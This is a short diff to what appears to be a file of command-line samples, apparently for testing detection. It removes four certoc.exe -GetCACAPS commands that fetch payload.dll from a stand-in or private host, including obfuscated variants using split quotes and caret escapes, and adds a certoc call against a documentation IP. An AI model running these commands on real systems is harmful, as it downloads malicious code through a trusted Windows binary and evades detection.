@@ -1,4 +1,1 @@
-certoc.exe -GetCACAPS "h""ttp://example.com/payload.dll"
-certoc.exe /GetCACAPS http://example.com/payload.dll
-certoc.exe /GetCACAPS http://192.168.1.100/payload.ext
-cmd.exe /c "certoc.exe -GetCACAPS h^t^t^p^:^/^/http://example.com/payload.dll"
+"C:\Windows\SysWOW64\certoc.exe" -GetCACAPS http://192.0.2.10/certsrv/
